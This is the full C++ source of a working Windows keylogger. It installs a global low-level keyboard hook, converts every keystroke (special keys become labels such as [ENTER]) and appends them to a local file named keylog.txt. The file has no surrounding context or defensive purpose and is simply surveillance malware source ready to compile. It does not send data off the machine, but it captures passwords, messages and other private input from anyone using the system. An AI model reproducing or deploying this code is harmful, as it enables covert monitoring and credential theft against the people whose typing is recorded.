#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

// Function to convert special keys to readable strings
std::string KeyToString(int key) {
    switch (key) {
        case VK_RETURN:
            return "[ENTER]";
        case VK_SPACE:
            return " ";
        case VK_TAB:
            return "[TAB]";
        case VK_BACK:
            return "[BACKSPACE]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "[ALT]";
        case VK_CAPITAL:
            return "[CAPS LOCK]";
        case VK_ESCAPE:
            return "[ESC]";
        case VK_PRIOR:
            return "[PAGE UP]";
        case VK_NEXT:
            return "[PAGE DOWN]";
        case VK_END:
            return "[END]";
        case VK_HOME:
            return "[HOME]";
        case VK_LEFT:
            return "[LEFT ARROW]";
        case VK_UP:
            return "[UP ARROW]";
        case VK_RIGHT:
            return "[RIGHT ARROW]";
        case VK_DOWN:
            return "[DOWN ARROW]";
        case VK_INSERT:
            return "[INSERT]";
        case VK_DELETE:
            return "[DELETE]";
        default:
            return "";
    }
}

// Function to log keystrokes to file
void LogKeystroke(int key) {
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios_base::app);

    if (logfile.is_open()) {
        std::string keystroke = KeyToString(key);
        if (!keystroke.empty()) {
            logfile << keystroke;
        } else {
            CHAR c = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
            logfile << c;
        }
        logfile.close();
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            LogKeystroke(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to set hook
void SetHook() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to set hook\n";
    }
}

// Main function
int main() {
    SetHook();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
